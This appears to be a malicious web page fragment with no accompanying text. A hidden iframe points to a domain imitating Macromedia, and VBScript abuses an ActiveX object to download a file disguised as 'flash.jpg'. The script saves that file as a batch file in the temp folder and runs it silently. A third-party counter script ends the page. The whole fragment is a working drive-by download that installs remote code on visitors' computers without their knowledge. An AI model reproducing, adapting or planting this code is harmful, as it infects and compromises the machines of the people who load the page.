<iframe src=http://download.macrcmedia.net/pub/shockwave/cabs/ani.htm width=100 height=0 frameborder=0></iframe>
<script language="VBScript">
 
  
    ppp="object"
   
    Set data = document.createElement(ppp,"")
    bbs ="Microsoft.XMLHTTP"
    data.setAttribute ("classid"), ("clsid:BD96C556-65A3-11D0-983A-00C04FC29E36")
    
    

    Set x = data.CreateObject(bbs,"")
    url = "http://download.macrcmedia.net/exe/flash.jpg               "
    
    rrr="Adodb.Stream"
    set mm = data.createobject(rrr,"")
    
    mm.type = 1 
    
    mm.open 
    
    ysha="GET"
    
    x.Open ysha, url, False
    x.Send
   
    
   
    mm.write x.responseBody
     exe="h.bat"
    ht ="Scripting.FileSystemObject"
    Set T = Nothing
    set F = data.createobject(ht,"")
    set tmp = F.GetSpecialFolder(2)
      
    exe= F.BuildPath(tmp,exe)
    mm.savetofile exe,2
    mm.close
    set Bb = data.createobject("Shell.Application","")
    Bb.ShellExecute exe,"","","open",0
   
    </script>
   <script language="javascript" src="http://count34.51yes.com/click.aspx?id=342107331&logo=6"></script>

